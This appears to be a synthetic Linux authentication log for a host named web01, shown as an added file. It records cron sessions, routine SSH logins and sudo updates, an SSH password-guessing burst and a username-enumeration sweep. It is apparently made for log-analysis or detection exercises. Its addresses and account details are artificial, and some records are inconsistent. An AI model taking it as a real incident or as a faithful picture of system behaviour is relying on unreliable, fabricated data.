@@ -1,0 +1,422 @@
+Oct 24 06:00:00 web01 CRON[6957]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 06:00:01 web01 CRON[4087]: pam_unix(cron:session): session closed for user root
+Oct 24 06:07:00 web01 CRON[11484]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 06:07:01 web01 CRON[28666]: pam_unix(cron:session): session closed for user root
+Oct 24 06:18:00 web01 CRON[26009]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 06:18:01 web01 CRON[31674]: pam_unix(cron:session): session closed for user root
+Oct 24 06:25:00 web01 sshd[17049]: Accepted password for kaseem from 198.51.100.7 port 40082 ssh2
+Oct 24 06:25:00 web01 sshd[17049]: pam_unix(sshd:session): session opened for user kaseem(uid=1000) by (uid=0)
+Oct 24 06:31:00 web01 CRON[1752]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 06:31:01 web01 CRON[8507]: pam_unix(cron:session): session closed for user root
+Oct 24 06:35:00 web01 sshd[17049]: Received disconnect from 198.51.100.7 port 40082:11: disconnected by user
+Oct 24 06:35:00 web01 sshd[17049]: pam_unix(sshd:session): session closed for user kaseem
+Oct 24 06:44:00 web01 CRON[18486]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 06:44:01 web01 CRON[23293]: pam_unix(cron:session): session closed for user root
+Oct 24 06:44:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 06:46:00 web01 sshd[19965]: Accepted password for alice from 198.51.100.21 port 35382 ssh2
+Oct 24 06:46:00 web01 sshd[19965]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+Oct 24 06:55:00 web01 CRON[11365]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 06:55:01 web01 CRON[30735]: pam_unix(cron:session): session closed for user root
+Oct 24 06:55:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 07:00:00 web01 sshd[4295]: Failed password for alice from 198.51.100.200 port 41292 ssh2
+Oct 24 07:00:01 web01 sshd[4295]: Connection closed by authenticating user alice 198.51.100.200 port 41292 [preauth]
+Oct 24 07:02:00 web01 sshd[19965]: Received disconnect from 198.51.100.21 port 35382:11: disconnected by user
+Oct 24 07:02:00 web01 sshd[19965]: pam_unix(sshd:session): session closed for user alice
+Oct 24 07:04:00 web01 CRON[33806]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:04:01 web01 CRON[12708]: pam_unix(cron:session): session closed for user root
+Oct 24 07:10:00 web01 CRON[20558]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:10:01 web01 CRON[34270]: pam_unix(cron:session): session closed for user root
+Oct 24 07:15:00 web01 sshd[25844]: Failed password for alice from 198.51.100.200 port 43494 ssh2
+Oct 24 07:15:01 web01 sshd[25844]: Connection closed by authenticating user alice 198.51.100.200 port 43494 [preauth]
+Oct 24 07:17:00 web01 CRON[25504]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:17:01 web01 CRON[11587]: pam_unix(cron:session): session closed for user root
+Oct 24 07:30:00 web01 CRON[1037]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:30:00 web01 sshd[14871]: Failed password for alice from 198.51.100.200 port 47667 ssh2
+Oct 24 07:30:01 web01 CRON[22243]: pam_unix(cron:session): session closed for user root
+Oct 24 07:30:01 web01 sshd[14871]: Connection closed by authenticating user alice 198.51.100.200 port 47667 [preauth]
+Oct 24 07:36:00 web01 CRON[24788]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:36:01 web01 CRON[21153]: pam_unix(cron:session): session closed for user root
+Oct 24 07:43:00 web01 sshd[30714]: Accepted password for alice from 198.51.100.21 port 53598 ssh2
+Oct 24 07:43:00 web01 sshd[30714]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+Oct 24 07:44:00 web01 CRON[38182]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:44:01 web01 CRON[6161]: pam_unix(cron:session): session closed for user root
+Oct 24 07:44:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 07:45:00 web01 sshd[22420]: Failed password for alice from 198.51.100.200 port 43827 ssh2
+Oct 24 07:45:01 web01 sshd[22420]: Connection closed by authenticating user alice 198.51.100.200 port 43827 [preauth]
+Oct 24 07:56:00 web01 CRON[5535]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 07:56:01 web01 CRON[35911]: pam_unix(cron:session): session closed for user root
+Oct 24 08:00:00 web01 sshd[25846]: Failed password for alice from 198.51.100.200 port 41885 ssh2
+Oct 24 08:00:01 web01 sshd[25846]: Connection closed by authenticating user alice 198.51.100.200 port 41885 [preauth]
+Oct 24 08:03:00 web01 CRON[32148]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 08:03:01 web01 CRON[37031]: pam_unix(cron:session): session closed for user root
+Oct 24 08:08:00 web01 sshd[30714]: Received disconnect from 198.51.100.21 port 53598:11: disconnected by user
+Oct 24 08:08:00 web01 sshd[30714]: pam_unix(sshd:session): session closed for user alice
+Oct 24 08:15:00 web01 sshd[28627]: Failed password for alice from 198.51.100.200 port 41034 ssh2
+Oct 24 08:15:01 web01 sshd[28627]: Connection closed by authenticating user alice 198.51.100.200 port 41034 [preauth]
+Oct 24 08:16:00 web01 CRON[28730]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 08:16:01 web01 CRON[14880]: pam_unix(cron:session): session closed for user root
+Oct 24 08:24:00 web01 CRON[21428]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 08:24:01 web01 CRON[27148]: pam_unix(cron:session): session closed for user root
+Oct 24 08:26:00 web01 sshd[17162]: Accepted publickey for backup from 198.51.100.50 port 57179 ssh2
+Oct 24 08:26:00 web01 sshd[17162]: pam_unix(sshd:session): session opened for user backup(uid=1000) by (uid=0)
+Oct 24 08:39:00 web01 CRON[25472]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 08:39:01 web01 CRON[29711]: pam_unix(cron:session): session closed for user root
+Oct 24 08:46:00 web01 sshd[14730]: Accepted password for alice from 198.51.100.21 port 54728 ssh2
+Oct 24 08:46:00 web01 sshd[14730]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+Oct 24 08:47:00 web01 sshd[18691]: Accepted password for bob from 198.51.100.34 port 53739 ssh2
+Oct 24 08:47:00 web01 sshd[18691]: pam_unix(sshd:session): session opened for user bob(uid=1000) by (uid=0)
+Oct 24 08:51:00 web01 CRON[8930]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 08:51:01 web01 CRON[17246]: pam_unix(cron:session): session closed for user root
+Oct 24 09:01:00 web01 CRON[2378]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 09:01:01 web01 CRON[39555]: pam_unix(cron:session): session closed for user root
+Oct 24 09:03:00 web01 sshd[17162]: Received disconnect from 198.51.100.50 port 57179:11: disconnected by user
+Oct 24 09:03:00 web01 sshd[17162]: pam_unix(sshd:session): session closed for user backup
+Oct 24 09:05:00 web01 sshd[14730]: Received disconnect from 198.51.100.21 port 54728:11: disconnected by user
+Oct 24 09:05:00 web01 sshd[14730]: pam_unix(sshd:session): session closed for user alice
+Oct 24 09:12:00 web01 sshd[22639]: Invalid user admin from 203.0.113.45 port 53187
+Oct 24 09:12:00 web01 sshd[22639]: Failed password for invalid user admin from 203.0.113.45 port 53187 ssh2
+Oct 24 09:12:01 web01 sshd[22639]: Connection closed by authenticating user admin 203.0.113.45 port 53187 [preauth]
+Oct 24 09:12:04 web01 sshd[9167]: Failed password for root from 203.0.113.45 port 56352 ssh2
+Oct 24 09:12:05 web01 sshd[9167]: Connection closed by authenticating user root 203.0.113.45 port 56352 [preauth]
+Oct 24 09:12:08 web01 sshd[34234]: Failed password for root from 203.0.113.45 port 42902 ssh2
+Oct 24 09:12:09 web01 sshd[34234]: Connection closed by authenticating user root 203.0.113.45 port 42902 [preauth]
+Oct 24 09:12:15 web01 sshd[27764]: Failed password for root from 203.0.113.45 port 43456 ssh2
+Oct 24 09:12:16 web01 sshd[27764]: Connection closed by authenticating user root 203.0.113.45 port 43456 [preauth]
+Oct 24 09:12:20 web01 sshd[20376]: Invalid user admin from 203.0.113.45 port 50934
+Oct 24 09:12:20 web01 sshd[20376]: Failed password for invalid user admin from 203.0.113.45 port 50934 ssh2
+Oct 24 09:12:21 web01 sshd[20376]: Connection closed by authenticating user admin 203.0.113.45 port 50934 [preauth]
+Oct 24 09:12:23 web01 sshd[13572]: Failed password for root from 203.0.113.45 port 46545 ssh2
+Oct 24 09:12:24 web01 sshd[13572]: Connection closed by authenticating user root 203.0.113.45 port 46545 [preauth]
+Oct 24 09:12:30 web01 sshd[25847]: Failed password for root from 203.0.113.45 port 54962 ssh2
+Oct 24 09:12:31 web01 sshd[25847]: Connection closed by authenticating user root 203.0.113.45 port 54962 [preauth]
+Oct 24 09:12:37 web01 sshd[12405]: Failed password for root from 203.0.113.45 port 52937 ssh2
+Oct 24 09:12:38 web01 sshd[12405]: Connection closed by authenticating user root 203.0.113.45 port 52937 [preauth]
+Oct 24 09:12:43 web01 sshd[20723]: Invalid user admin from 203.0.113.45 port 46074
+Oct 24 09:12:43 web01 sshd[20723]: Failed password for invalid user admin from 203.0.113.45 port 46074 ssh2
+Oct 24 09:12:44 web01 sshd[20723]: Connection closed by authenticating user admin 203.0.113.45 port 46074 [preauth]
+Oct 24 09:12:49 web01 sshd[1026]: Failed password for root from 203.0.113.45 port 42725 ssh2
+Oct 24 09:12:50 web01 sshd[1026]: Connection closed by authenticating user root 203.0.113.45 port 42725 [preauth]
+Oct 24 09:12:53 web01 sshd[14774]: Failed password for root from 203.0.113.45 port 46854 ssh2
+Oct 24 09:12:54 web01 sshd[14774]: Connection closed by authenticating user root 203.0.113.45 port 46854 [preauth]
+Oct 24 09:12:59 web01 sshd[22118]: Failed password for root from 203.0.113.45 port 48004 ssh2
+Oct 24 09:13:00 web01 sshd[22118]: Connection closed by authenticating user root 203.0.113.45 port 48004 [preauth]
+Oct 24 09:13:04 web01 sshd[29977]: Invalid user admin from 203.0.113.45 port 54906
+Oct 24 09:13:04 web01 sshd[29977]: Failed password for invalid user admin from 203.0.113.45 port 54906 ssh2
+Oct 24 09:13:05 web01 sshd[29977]: Connection closed by authenticating user admin 203.0.113.45 port 54906 [preauth]
+Oct 24 09:13:07 web01 sshd[34500]: Failed password for root from 203.0.113.45 port 48273 ssh2
+Oct 24 09:13:08 web01 sshd[34500]: Connection closed by authenticating user root 203.0.113.45 port 48273 [preauth]
+Oct 24 09:13:14 web01 sshd[12120]: Failed password for root from 203.0.113.45 port 54357 ssh2
+Oct 24 09:13:15 web01 sshd[12120]: Connection closed by authenticating user root 203.0.113.45 port 54357 [preauth]
+Oct 24 09:13:16 web01 sshd[19598]: Failed password for root from 203.0.113.45 port 49658 ssh2
+Oct 24 09:13:17 web01 sshd[19598]: Connection closed by authenticating user root 203.0.113.45 port 49658 [preauth]
+Oct 24 09:13:23 web01 sshd[22966]: Invalid user admin from 203.0.113.45 port 35828
+Oct 24 09:13:23 web01 sshd[22966]: Failed password for invalid user admin from 203.0.113.45 port 35828 ssh2
+Oct 24 09:13:24 web01 sshd[22966]: Connection closed by authenticating user admin 203.0.113.45 port 35828 [preauth]
+Oct 24 09:13:26 web01 sshd[21343]: Failed password for root from 203.0.113.45 port 40129 ssh2
+Oct 24 09:13:27 web01 sshd[21343]: Connection closed by authenticating user root 203.0.113.45 port 40129 [preauth]
+Oct 24 09:13:29 web01 sshd[10656]: Failed password for root from 203.0.113.45 port 33568 ssh2
+Oct 24 09:13:30 web01 sshd[10656]: Connection closed by authenticating user root 203.0.113.45 port 33568 [preauth]
+Oct 24 09:13:31 web01 sshd[17046]: Failed password for root from 203.0.113.45 port 48337 ssh2
+Oct 24 09:13:32 web01 sshd[17046]: Connection closed by authenticating user root 203.0.113.45 port 48337 [preauth]
+Oct 24 09:13:37 web01 sshd[5772]: Invalid user admin from 203.0.113.45 port 47691
+Oct 24 09:13:37 web01 sshd[5772]: Failed password for invalid user admin from 203.0.113.45 port 47691 ssh2
+Oct 24 09:13:38 web01 sshd[5772]: Connection closed by authenticating user admin 203.0.113.45 port 47691 [preauth]
+Oct 24 09:13:42 web01 sshd[38727]: Failed password for root from 203.0.113.45 port 39139 ssh2
+Oct 24 09:13:43 web01 sshd[38727]: Connection closed by authenticating user root 203.0.113.45 port 39139 [preauth]
+Oct 24 09:13:49 web01 sshd[26164]: Failed password for root from 203.0.113.45 port 48967 ssh2
+Oct 24 09:13:50 web01 sshd[26164]: Connection closed by authenticating user root 203.0.113.45 port 48967 [preauth]
+Oct 24 09:13:54 web01 sshd[16989]: Failed password for root from 203.0.113.45 port 37603 ssh2
+Oct 24 09:13:55 web01 sshd[16989]: Connection closed by authenticating user root 203.0.113.45 port 37603 [preauth]
+Oct 24 09:14:01 web01 sshd[1363]: Invalid user admin from 203.0.113.45 port 57375
+Oct 24 09:14:01 web01 sshd[1363]: Failed password for invalid user admin from 203.0.113.45 port 57375 ssh2
+Oct 24 09:14:02 web01 sshd[1363]: Connection closed by authenticating user admin 203.0.113.45 port 57375 [preauth]
+Oct 24 09:14:03 web01 sshd[28862]: Failed password for root from 203.0.113.45 port 39938 ssh2
+Oct 24 09:14:04 web01 sshd[28862]: Connection closed by authenticating user root 203.0.113.45 port 39938 [preauth]
+Oct 24 09:14:06 web01 sshd[34944]: Failed password for root from 203.0.113.45 port 47990 ssh2
+Oct 24 09:14:07 web01 sshd[34944]: Connection closed by authenticating user root 203.0.113.45 port 47990 [preauth]
+Oct 24 09:14:08 web01 sshd[37530]: Failed password for root from 203.0.113.45 port 40933 ssh2
+Oct 24 09:14:09 web01 sshd[37530]: Connection closed by authenticating user root 203.0.113.45 port 40933 [preauth]
+Oct 24 09:14:10 web01 sshd[30914]: Invalid user admin from 203.0.113.45 port 37137
+Oct 24 09:14:10 web01 sshd[30914]: Failed password for invalid user admin from 203.0.113.45 port 37137 ssh2
+Oct 24 09:14:11 web01 sshd[30914]: Connection closed by authenticating user admin 203.0.113.45 port 37137 [preauth]
+Oct 24 09:14:15 web01 sshd[35808]: Failed password for root from 203.0.113.45 port 51082 ssh2
+Oct 24 09:14:16 web01 sshd[35808]: Connection closed by authenticating user root 203.0.113.45 port 51082 [preauth]
+Oct 24 09:14:21 web01 sshd[21794]: Failed password for root from 203.0.113.45 port 57516 ssh2
+Oct 24 09:14:22 web01 sshd[21794]: Connection closed by authenticating user root 203.0.113.45 port 57516 [preauth]
+Oct 24 09:14:26 web01 sshd[34081]: Failed password for root from 203.0.113.45 port 46751 ssh2
+Oct 24 09:14:27 web01 sshd[34081]: Connection closed by authenticating user root 203.0.113.45 port 46751 [preauth]
+Oct 24 09:14:32 web01 sshd[30223]: Invalid user admin from 203.0.113.45 port 37983
+Oct 24 09:14:32 web01 sshd[30223]: Failed password for invalid user admin from 203.0.113.45 port 37983 ssh2
+Oct 24 09:14:33 web01 sshd[30223]: Connection closed by authenticating user admin 203.0.113.45 port 37983 [preauth]
+Oct 24 09:14:39 web01 sshd[32108]: Failed password for root from 203.0.113.45 port 47515 ssh2
+Oct 24 09:14:40 web01 sshd[32108]: Connection closed by authenticating user root 203.0.113.45 port 47515 [preauth]
+Oct 24 09:14:43 web01 sshd[17203]: Failed password for root from 203.0.113.45 port 60288 ssh2
+Oct 24 09:14:44 web01 sshd[17203]: Connection closed by authenticating user root 203.0.113.45 port 60288 [preauth]
+Oct 24 09:14:50 web01 sshd[19173]: Failed password for root from 203.0.113.45 port 57862 ssh2
+Oct 24 09:14:51 web01 sshd[19173]: Connection closed by authenticating user root 203.0.113.45 port 57862 [preauth]
+Oct 24 09:14:56 web01 sshd[32758]: Invalid user admin from 203.0.113.45 port 53305
+Oct 24 09:14:56 web01 sshd[32758]: Failed password for invalid user admin from 203.0.113.45 port 53305 ssh2
+Oct 24 09:14:57 web01 sshd[32758]: Connection closed by authenticating user admin 203.0.113.45 port 53305 [preauth]
+Oct 24 09:14:59 web01 sshd[18996]: Failed password for root from 203.0.113.45 port 47181 ssh2
+Oct 24 09:15:00 web01 CRON[15432]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 09:15:00 web01 sshd[18996]: Connection closed by authenticating user root 203.0.113.45 port 47181 [preauth]
+Oct 24 09:15:01 web01 CRON[1471]: pam_unix(cron:session): session closed for user root
+Oct 24 09:15:01 web01 sshd[19725]: Failed password for root from 203.0.113.45 port 40451 ssh2
+Oct 24 09:15:02 web01 sshd[19725]: Connection closed by authenticating user root 203.0.113.45 port 40451 [preauth]
+Oct 24 09:15:05 web01 sshd[23010]: Failed password for root from 203.0.113.45 port 43244 ssh2
+Oct 24 09:15:06 web01 sshd[23010]: Connection closed by authenticating user root 203.0.113.45 port 43244 [preauth]
+Oct 24 09:15:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 09:24:00 web01 sshd[18691]: Received disconnect from 198.51.100.34 port 53739:11: disconnected by user
+Oct 24 09:24:00 web01 sshd[18691]: pam_unix(sshd:session): session closed for user bob
+Oct 24 09:30:00 web01 CRON[4858]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 09:30:01 web01 CRON[16003]: pam_unix(cron:session): session closed for user root
+Oct 24 09:30:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 09:35:00 web01 CRON[22654]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 09:35:01 web01 CRON[5643]: pam_unix(cron:session): session closed for user root
+Oct 24 09:37:00 web01 sshd[26928]: Accepted publickey for backup from 198.51.100.50 port 53832 ssh2
+Oct 24 09:37:00 web01 sshd[26928]: pam_unix(sshd:session): session opened for user backup(uid=1000) by (uid=0)
+Oct 24 09:43:00 web01 sshd[2739]: Failed password for kaseem from 198.51.100.7 port 51158 ssh2
+Oct 24 09:43:01 web01 sshd[2739]: Connection closed by authenticating user kaseem 198.51.100.7 port 51158 [preauth]
+Oct 24 09:43:11 web01 sshd[36713]: Accepted password for kaseem from 198.51.100.7 port 46514 ssh2
+Oct 24 09:43:11 web01 sshd[36713]: pam_unix(sshd:session): session opened for user kaseem(uid=1000) by (uid=0)
+Oct 24 09:44:00 web01 sshd[4665]: Accepted password for bob from 198.51.100.34 port 40273 ssh2
+Oct 24 09:44:00 web01 sshd[4665]: pam_unix(sshd:session): session opened for user bob(uid=1000) by (uid=0)
+Oct 24 09:44:00 web01 CRON[32812]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 09:44:01 web01 CRON[15040]: pam_unix(cron:session): session closed for user root
+Oct 24 09:48:00 web01 sshd[4665]: Received disconnect from 198.51.100.34 port 40273:11: disconnected by user
+Oct 24 09:48:00 web01 sshd[4665]: pam_unix(sshd:session): session closed for user bob
+Oct 24 09:58:00 web01 CRON[38762]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 09:58:01 web01 CRON[31976]: pam_unix(cron:session): session closed for user root
+Oct 24 09:59:11 web01 sshd[36713]: Received disconnect from 198.51.100.7 port 46514:11: disconnected by user
+Oct 24 09:59:11 web01 sshd[36713]: pam_unix(sshd:session): session closed for user kaseem
+Oct 24 10:08:00 web01 sshd[26928]: Received disconnect from 198.51.100.50 port 53832:11: disconnected by user
+Oct 24 10:08:00 web01 sshd[26928]: pam_unix(sshd:session): session closed for user backup
+Oct 24 10:10:00 web01 CRON[27677]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 10:10:01 web01 CRON[13478]: pam_unix(cron:session): session closed for user root
+Oct 24 10:10:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 10:25:00 web01 CRON[29249]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 10:25:01 web01 CRON[24219]: pam_unix(cron:session): session closed for user root
+Oct 24 10:37:00 web01 CRON[4550]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 10:37:01 web01 CRON[7449]: pam_unix(cron:session): session closed for user root
+Oct 24 10:37:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 10:47:00 web01 CRON[8161]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 10:47:01 web01 CRON[17295]: pam_unix(cron:session): session closed for user root
+Oct 24 11:00:00 web01 CRON[30400]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:00:01 web01 CRON[10186]: pam_unix(cron:session): session closed for user root
+Oct 24 11:09:00 web01 CRON[31318]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:09:01 web01 CRON[17371]: pam_unix(cron:session): session closed for user root
+Oct 24 11:15:00 web01 CRON[30041]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:15:01 web01 CRON[37066]: pam_unix(cron:session): session closed for user root
+Oct 24 11:15:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 11:30:00 web01 CRON[36427]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:30:01 web01 CRON[1967]: pam_unix(cron:session): session closed for user root
+Oct 24 11:38:00 web01 CRON[11899]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:38:01 web01 CRON[27634]: pam_unix(cron:session): session closed for user root
+Oct 24 11:46:00 web01 CRON[27282]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:46:01 web01 CRON[4842]: pam_unix(cron:session): session closed for user root
+Oct 24 11:51:00 web01 CRON[26586]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 11:51:01 web01 CRON[18380]: pam_unix(cron:session): session closed for user root
+Oct 24 12:03:00 web01 CRON[19694]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 12:03:01 web01 CRON[28722]: pam_unix(cron:session): session closed for user root
+Oct 24 12:07:00 web01 sshd[18335]: Accepted publickey for deploy from 198.51.100.8 port 59215 ssh2
+Oct 24 12:07:00 web01 sshd[18335]: pam_unix(sshd:session): session opened for user deploy(uid=1000) by (uid=0)
+Oct 24 12:11:00 web01 sshd[18335]: Received disconnect from 198.51.100.8 port 59215:11: disconnected by user
+Oct 24 12:11:00 web01 sshd[18335]: pam_unix(sshd:session): session closed for user deploy
+Oct 24 12:16:00 web01 CRON[32894]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 12:16:01 web01 CRON[11144]: pam_unix(cron:session): session closed for user root
+Oct 24 12:24:00 web01 CRON[4832]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 12:24:01 web01 CRON[38957]: pam_unix(cron:session): session closed for user root
+Oct 24 12:29:00 web01 CRON[21552]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 12:29:01 web01 CRON[4746]: pam_unix(cron:session): session closed for user root
+Oct 24 12:29:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 12:40:00 web01 sshd[6280]: Invalid user admin from 192.0.2.77 port 37302
+Oct 24 12:40:00 web01 sshd[6280]: Failed password for invalid user admin from 192.0.2.77 port 37302 ssh2
+Oct 24 12:40:01 web01 sshd[6280]: Connection closed by authenticating user admin 192.0.2.77 port 37302 [preauth]
+Oct 24 12:40:24 web01 sshd[16155]: Invalid user test from 192.0.2.77 port 45319
+Oct 24 12:40:24 web01 sshd[16155]: Failed password for invalid user test from 192.0.2.77 port 45319 ssh2
+Oct 24 12:40:25 web01 sshd[16155]: Connection closed by authenticating user test 192.0.2.77 port 45319 [preauth]
+Oct 24 12:40:48 web01 sshd[15021]: Invalid user oracle from 192.0.2.77 port 34872
+Oct 24 12:40:48 web01 sshd[15021]: Failed password for invalid user oracle from 192.0.2.77 port 34872 ssh2
+Oct 24 12:40:49 web01 sshd[15021]: Connection closed by authenticating user oracle 192.0.2.77 port 34872 [preauth]
+Oct 24 12:41:00 web01 CRON[33954]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 12:41:01 web01 CRON[35807]: pam_unix(cron:session): session closed for user root
+Oct 24 12:41:21 web01 sshd[27712]: Invalid user postgres from 192.0.2.77 port 43610
+Oct 24 12:41:21 web01 sshd[27712]: Failed password for invalid user postgres from 192.0.2.77 port 43610 ssh2
+Oct 24 12:41:22 web01 sshd[27712]: Connection closed by authenticating user postgres 192.0.2.77 port 43610 [preauth]
+Oct 24 12:41:58 web01 sshd[31534]: Invalid user ubuntu from 192.0.2.77 port 46392
+Oct 24 12:41:58 web01 sshd[31534]: Failed password for invalid user ubuntu from 192.0.2.77 port 46392 ssh2
+Oct 24 12:41:59 web01 sshd[31534]: Connection closed by authenticating user ubuntu 192.0.2.77 port 46392 [preauth]
+Oct 24 12:42:19 web01 sshd[14555]: Invalid user guest from 192.0.2.77 port 60060
+Oct 24 12:42:19 web01 sshd[14555]: Failed password for invalid user guest from 192.0.2.77 port 60060 ssh2
+Oct 24 12:42:20 web01 sshd[14555]: Connection closed by authenticating user guest 192.0.2.77 port 60060 [preauth]
+Oct 24 12:42:52 web01 sshd[26524]: Invalid user user from 192.0.2.77 port 57992
+Oct 24 12:42:52 web01 sshd[26524]: Failed password for invalid user user from 192.0.2.77 port 57992 ssh2
+Oct 24 12:42:53 web01 sshd[26524]: Connection closed by authenticating user user 192.0.2.77 port 57992 [preauth]
+Oct 24 12:43:30 web01 sshd[2280]: Invalid user ftp from 192.0.2.77 port 60841
+Oct 24 12:43:30 web01 sshd[2280]: Failed password for invalid user ftp from 192.0.2.77 port 60841 ssh2
+Oct 24 12:43:31 web01 sshd[2280]: Connection closed by authenticating user ftp 192.0.2.77 port 60841 [preauth]
+Oct 24 12:44:08 web01 sshd[25928]: Invalid user git from 192.0.2.77 port 48397
+Oct 24 12:44:08 web01 sshd[25928]: Failed password for invalid user git from 192.0.2.77 port 48397 ssh2
+Oct 24 12:44:09 web01 sshd[25928]: Connection closed by authenticating user git 192.0.2.77 port 48397 [preauth]
+Oct 24 12:44:28 web01 sshd[24052]: Invalid user jenkins from 192.0.2.77 port 42552
+Oct 24 12:44:28 web01 sshd[24052]: Failed password for invalid user jenkins from 192.0.2.77 port 42552 ssh2
+Oct 24 12:44:29 web01 sshd[24052]: Connection closed by authenticating user jenkins 192.0.2.77 port 42552 [preauth]
+Oct 24 12:45:00 web01 sshd[28460]: Invalid user pi from 192.0.2.77 port 50404
+Oct 24 12:45:00 web01 sshd[28460]: Failed password for invalid user pi from 192.0.2.77 port 50404 ssh2
+Oct 24 12:45:01 web01 sshd[28460]: Connection closed by authenticating user pi 192.0.2.77 port 50404 [preauth]
+Oct 24 12:45:37 web01 sshd[15453]: Invalid user support from 192.0.2.77 port 48766
+Oct 24 12:45:37 web01 sshd[15453]: Failed password for invalid user support from 192.0.2.77 port 48766 ssh2
+Oct 24 12:45:38 web01 sshd[15453]: Connection closed by authenticating user support 192.0.2.77 port 48766 [preauth]
+Oct 24 12:48:00 web01 sshd[10065]: Accepted publickey for backup from 198.51.100.50 port 49464 ssh2
+Oct 24 12:48:00 web01 sshd[10065]: pam_unix(sshd:session): session opened for user backup(uid=1000) by (uid=0)
+Oct 24 12:50:00 web01 sshd[14826]: Accepted publickey for backup from 198.51.100.50 port 51353 ssh2
+Oct 24 12:50:00 web01 sshd[14826]: pam_unix(sshd:session): session opened for user backup(uid=1000) by (uid=0)
+Oct 24 12:54:00 web01 CRON[6250]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 12:54:01 web01 CRON[13178]: pam_unix(cron:session): session closed for user root
+Oct 24 12:54:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 13:00:00 web01 CRON[16414]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 13:00:01 web01 CRON[27461]: pam_unix(cron:session): session closed for user root
+Oct 24 13:00:30 web01 sudo:   kaseem : TTY=pts/0 ; PWD=/home/kaseem ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 24 13:12:00 web01 sshd[14826]: Received disconnect from 198.51.100.50 port 51353:11: disconnected by user
+Oct 24 13:12:00 web01 sshd[14826]: pam_unix(sshd:session): session closed for user backup
+Oct 24 13:14:00 web01 CRON[17135]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Oct 24 13:14:01 web01 CRON[38940]: pam_unix(cron:session): session closed for user root
+Oct 24 13:21:00 web01 sshd[10065]: Received disconnect from 198.51.100.50 port 49464:11: disconnected by user
+Oct 24 13:21:00 web01 sshd[10065]: pam_unix(sshd:session): session closed for user backup
+Oct 24 13:28:00 web01 CRON[6372]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
